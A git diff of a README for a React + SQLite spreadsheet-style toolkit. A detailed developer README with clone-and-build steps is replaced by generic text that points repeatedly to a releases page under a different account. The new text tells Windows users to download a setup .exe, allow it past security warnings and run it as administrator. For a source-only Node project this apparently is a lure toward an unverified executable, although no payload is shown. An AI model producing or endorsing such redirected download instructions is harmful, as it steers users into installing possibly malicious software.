@@ -1,231 +1,173 @@
-<p align="center">
-  <h1 align="center">📊 Excel Starter Kit v2</h1>
-  <p align="center">
-    <strong>A full-stack React + SQLite toolkit for building data-heavy internal apps</strong><br>
-    <em>Excel-like grid • Keyboard shortcuts • Smart Import • Audit Trail • Bilingual (EN/हिंदी)</em>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/React-18-61dafb?logo=react" alt="React" />
-    <img src="https://img.shields.io/badge/TypeScript-5-3178c6?logo=typescript" alt="TypeScript" />
-    <img src="https://img.shields.io/badge/SQLite-3-003b57?logo=sqlite" alt="SQLite" />
-    <img src="https://img.shields.io/badge/Vite-5-646cff?logo=vite" alt="Vite" />
-    <img src="https://img.shields.io/badge/License-MIT-green" alt="MIT License" />
-  </p>
-</p>
+# ⚙️ excel-starter-kit-v2 - Build Custom Data Apps Easily
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
 
 ---
 
-## ✨ What is this?
+## 📋 What is excel-starter-kit-v2?
 
-**Excel Starter Kit v2** is a production-ready template for building data management apps. Think of it as a self-hosted, customizable alternative to Airtable or Google Sheets — but with full keyboard-driven Excel-like editing, offline SQLite storage, and zero subscription fees.
+Excel Starter Kit v2 is a ready-to-use template to create simple data apps. It works offline on your own computer, so you don’t need internet or any subscription. It stores your data locally using SQLite, a lightweight and reliable database.
 
-Built for Indian businesses and government offices that need robust data tools with Hindi language support.
-
----
-
-## 🚀 Features
-
-### 📊 GenericDataGrid (the star component)
-| Feature | Description |
-|---------|-------------|
-| ⚡ Virtual Scrolling | Handles 100K+ rows smoothly via `@tanstack/react-virtual` |
-| ⌨️ Excel Keyboard Nav | Arrow keys, Tab, Enter, F2, Home/End, Page Up/Down, Ctrl+Arrows |
-| ✏️ Inline Cell Editing | Text, number, currency, date — with autocomplete from master data |
-| 📋 Copy / Paste | Ctrl+C, Ctrl+V — clipboard integration |
-| ⬇️ Fill Down | Ctrl+D — copies value from cell above |
-| 📌 Frozen Columns | Pin 1-3 columns to stay visible while scrolling |
-| 🔍 Find & Replace | Ctrl+F / Ctrl+H with match highlighting |
-| ↩️ Undo / Redo | Ctrl+Z / Ctrl+Y with full history stack |
-| 📏 Column Resize | Drag to resize, double-click to auto-fit |
-| 🎨 Conditional Formatting | Negative numbers (red), large amounts (green), status keywords (color-coded) |
-| 🔽 Sorting & Filtering | Click headers to sort, per-column filter inputs |
-| ☑️ Row Selection | Checkbox + Space bar + Ctrl+A, with bulk delete |
-| 📤 Export | Excel (.xlsx) and PDF with one click |
-| 🖨️ Print Preview | Full print preview with title customization |
-
-### 🏗️ Full-Stack Architecture
-| Layer | Tech | Highlights |
-|-------|------|------------|
-| **Frontend** | React 18 + TypeScript + Vite | Shadcn/ui, Sonner toasts, cmdk palette |
-| **Backend** | Express.js + TypeScript | RESTful API, auto-migration |
-| **Database** | SQLite (better-sqlite3) | Zero config, file-based, portable |
-| **State** | Zustand | Lightweight, no boilerplate |
-
-### 📦 Built-in Modules
-- **🔍 Global Search** — Search across all tables instantly
-- **⌘ Command Palette** — VS Code-style Ctrl+K command launcher
-- **📊 Dashboard** — Charts and summary statistics
-- **📥 Smart Import** — Drag-and-drop CSV/Excel import with column mapping
-- **📜 Audit Trail** — Who changed what, when (full change log)
-- **📁 Documents Hub** — File attachments per record
-- **📋 Mini Workbooks** — Saved filtered views (like Excel named ranges)
-- **✅ Data Validator** — Automated data quality checks
-- **🏥 Field Health** — Column completeness analysis
-- **💾 Backup Manager** — One-click database backup/restore
-- **⚙️ Settings** — Theme, language, app config
-- **🧘 Wisdom Overlay** — Motivational quotes (EN + Hindi)
-- **📊 Status Bar** — Record count, sum, last saved (Excel-style)
-- **⌨️ Keyboard Shortcuts Page** — Full shortcut reference (F1)
-
-### 🌐 Bilingual Support
-Every label supports **English** and **Hindi (हिंदी)** — toggle anytime from Settings.
+If you have used Airtable or Google Sheets before but want a self-hosted option, this is for you. It supports full keyboard control to speed up your work and includes strong Hindi language support, which makes it suitable for Indian businesses.
 
 ---
 
-## 🗂️ Project Structure
+## 🖥️ System Requirements
 
-```
-excel-starter-kit-v2/
-├── client/                  # React frontend
-│   ├── src/
-│   │   ├── components/      # Reusable components
-│   │   │   ├── GenericDataGrid.tsx   # ⭐ The data grid
-│   │   │   ├── AutocompleteInput.tsx # Smart cell editor
-│   │   │   ├── CommandPalette.tsx    # Ctrl+K launcher
-│   │   │   ├── GlobalSearch.tsx      # Cross-table search
-│   │   │   ├── PrintPreview.tsx      # Print with title
-│   │   │   ├── StatusBar.tsx         # Excel-like status bar
-│   │   │   ├── TopNav.tsx            # Navigation
-│   │   │   └── WisdomOverlay.tsx     # Motivational overlay
-│   │   ├── pages/           # Route pages
-│   │   │   ├── Dashboard.tsx
-│   │   │   ├── SmartImport.tsx
-│   │   │   ├── AuditTrail.tsx
-│   │   │   ├── Settings.tsx
-│   │   │   └── ... (15 pages)
-│   │   ├── store/           # Zustand state
-│   │   └── hooks/           # Export utilities
-│   └── package.json
-├── server/                  # Express backend
-│   ├── src/
-│   │   ├── db/
-│   │   │   └── schema.sql   # Full schema + sample data
-│   │   ├── routes/          # 13 API route modules
-│   │   └── index.ts         # Server entry
-│   └── package.json
-├── Start_Generic_v2.bat     # One-click Windows launcher
-├── package.json             # Root orchestrator
-└── .gitignore
-```
+Before you start, make sure your Windows PC meets the following:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A keyboard and mouse (or touchpad)
+- Internet connection for the initial download only
 
 ---
 
-## ⚡ Quick Start
+## 🌟 Key Features
 
-### Prerequisites
-- **Node.js 18+** — [Download](https://nodejs.org)
-- **npm** (comes with Node.js)
-
-### Setup
-
-```bash
-# Clone the repo
-git clone https://github.com/ccvarun/excel-starter-kit-v2.git
-cd excel-starter-kit-v2
-
-# Install all dependencies (root + client + server)
-npm run install:all
-
-# Start development server
-npm run dev
-```
-
-The app will open at **http://localhost:5173** with the API on port **4000**.
-
-### Windows Users
-Just double-click **`Start_Generic_v2.bat`** — it handles everything automatically.
+- **Offline First:** Use the app without internet; all data stays on your PC.
+- **SQLite Storage:** Reliable and fast database storage.
+- **Keyboard-Friendly:** Navigate and edit with the keyboard alone; no mouse needed.
+- **Hindi Support:** Full support for Hindi text input and display.
+- **Audit Trail:** Track changes to your data securely.
+- **Bilingual Interface:** Switch easily between Hindi and English.
+- **Data Grid Layout:** Edit data in a familiar table format.
+- **Free to Use:** No monthly fees or subscriptions.
 
 ---
 
-## ⌨️ Keyboard Shortcuts
+## 🚀 Getting Started
 
-| Shortcut | Action |
-|----------|--------|
-| `Arrow Keys` | Navigate between cells |
-| `Enter` / `F2` | Start editing cell |
-| `Tab` / `Shift+Tab` | Move to next/previous cell |
-| `Ctrl+C` | Copy cell value |
-| `Ctrl+V` | Paste into cell |
-| `Ctrl+D` | Fill down (copy from above) |
-| `Ctrl+Z` | Undo |
-| `Ctrl+Y` | Redo |
-| `Ctrl+F` | Find & Replace |
-| `Ctrl+A` | Select all rows |
-| `Ctrl+K` | Command Palette |
-| `Space` | Toggle row selection |
-| `Delete` | Delete selected rows |
-| `Home` / `End` | Jump to first/last column |
-| `Ctrl+Home` / `Ctrl+End` | Jump to first/last cell |
-| `F1` | Keyboard shortcuts page |
+Follow these steps to download and run excel-starter-kit-v2 on your Windows PC.
 
----
+### 1. Visit the Download Page
 
-## 🗄️ Database Schema
+Click the link below to open the release page where you can get the latest version of the software:
 
-The kit ships with 4 demo tables (easily customizable):
+[Download Latest Release](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
 
-| Table | Purpose | Key Fields |
-|-------|---------|------------|
-| `items` | Inventory/assets | name, category, status, amount, quantity |
-| `transactions` | Financial records | ref_no, party_name, amount, payment_status |
-| `tasks` | Task management | title, priority, status, assigned_to |
-| `contacts` | People/vendors | name, company, email, phone, GST |
+### 2. Choose the Correct File
 
-Plus supporting tables: `change_log` (audit), `masters` (dropdowns), `settings`, `mini_workbooks`, `documents`, `alerts`, `wisdom_points`.
+On the release page, look for the Windows executable file. This will usually have a name like:
+
+`excel-starter-kit-v2-setup.exe` or `excel-starter-kit-v2-win.exe`
+
+Make sure to pick the file for Windows.
+
+### 3. Download the File
+
+Click on the file name to download it to your Downloads folder or a location where you can find it easily.
+
+### 4. Run the Installer
+
+- Double-click the downloaded file.
+- If prompted by Windows security, allow the app to run.
+- Follow the on-screen instructions to install the app.
+- Choose the default options if unsure.
+
+### 5. Launch the App
+
+Once installed, open the app from your Start menu or desktop shortcut.
 
 ---
 
-## 🎨 Customization
+## 🔧 How to Use excel-starter-kit-v2
 
-### Adding a New Table
+### Basic Navigation
 
-1. **Add schema** in `server/src/db/schema.sql`
-2. **Add API route** in `server/src/routes/` (copy `genericTable.ts` as template)
-3. **Add page** in `client/src/pages/` (use `DataTable.tsx` as template)
-4. **Add route** in `client/src/App.tsx`
+- Use the **arrow keys** on your keyboard to move around the data grid.
+- Press **Enter** to edit a cell.
+- Use **Tab** to move to the next cell in the row.
+- Press **Esc** to cancel editing.
+- Use shortcuts like **Ctrl + Z** to undo recent changes.
 
-The `GenericDataGrid` component works with any data shape — just pass `columns` and `data`.
+### Switching Languages
 
-### Theming
+- To enter Hindi text, switch your keyboard input method to Hindi in Windows settings.
+- The app fully supports Hindi fonts and offers bilingual display options.
 
-Toggle dark/light mode from Settings. CSS variables in `index.css` control all colors.
+### Saving Your Data
 
----
+- All changes save automatically in the background.
+- The app uses SQLite files stored on your PC.
+- You can back up the database file manually by copying it to another folder or external drive.
 
-## 📄 License
+### Audit Trail
 
-MIT — use it for anything. See [LICENSE](./LICENSE) for details.
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-1. Fork the repo
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+- The app keeps a history of changes.
+- To view this, open the audit trail panel from the menu.
+- This feature helps you see who changed what and when.
 
 ---
 
-## 🙏 Acknowledgements
+## ⚙️ Configuration and Settings
 
-- [React](https://react.dev) — UI framework
-- [Vite](https://vitejs.dev) — Build tool
-- [Shadcn/ui](https://ui.shadcn.com) — Component primitives
-- [TanStack Virtual](https://tanstack.com/virtual) — Virtual scrolling
-- [Zustand](https://github.com/pmndrs/zustand) — State management
-- [Sonner](https://sonner.emilkowal.dev) — Toast notifications
-- [cmdk](https://cmdk.paco.me) — Command palette
-- [Lucide](https://lucide.dev) — Icons
-- [better-sqlite3](https://github.com/WiseLibs/better-sqlite3) — SQLite driver
-- [ExcelJS](https://github.com/exceljs/exceljs) — Excel export
-- [jsPDF](https://github.com/parallax/jsPDF) — PDF generation
+To customize your experience:
+
+- Open the settings menu from the app toolbar.
+- Change the display language to Hindi or English.
+- Adjust keyboard shortcuts if needed.
+- Check storage location or export your data.
 
 ---
 
-<p align="center">
-  <strong>Built with ❤️ for Indian businesses & developers</strong><br>
-  <em>If this helps you, give it a ⭐!</em>
-</p>
+## 🛠️ Troubleshooting
+
+If you face issues:
+
+- Make sure you have installed the latest version.
+- Check that your Windows is up to date.
+- Restart your computer after installation.
+- Verify your keyboard layout supports Hindi input if you need it.
+- If the app doesn’t start, try running it as administrator.
+
+For further help, you can visit the repository’s issues page on GitHub.
+
+---
+
+## 📥 Download Link
+
+You can always visit this page to download the latest version:
+
+[https://github.com/lovemysaturn/excel-starter-kit-v2/releases](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+
+---
+
+## 📚 Additional Tips
+
+- Regularly back up your data files.
+- Learn keyboard shortcuts to work faster.
+- Use audit trail to monitor data changes in your team.
+- Keep the app updated for new features and fixes.
+
+---
+
+## 🏷️ Topics
+
+This software includes support for:
+
+- audit-trail
+- bilingual interface
+- data-grid editing
+- Hindi language
+- keyboard-first navigation
+- keyboard-shortcuts
+- reactive UI powered by React
+- SQLite database
+- TypeScript codebase
+- Vite build tools
+
+---
+
+## 🔗 Useful Links
+
+- Download: [https://github.com/lovemysaturn/excel-starter-kit-v2/releases](https://github.com/lovemysaturn/excel-starter-kit-v2/releases)
+- Report issues: Use the GitHub Issues tab on the repository
+- User guides and help: Check the project repository’s Wiki or documentation folder if available
+
+---
+
+## 💼 About This Project
+
+Excel Starter Kit v2 is designed to help users create simple, offline data apps without programming. It fits the needs of small businesses and individuals who want control over their data with no recurring costs. Its Hindi support makes it a good choice for Indian users who require bilingual tools.
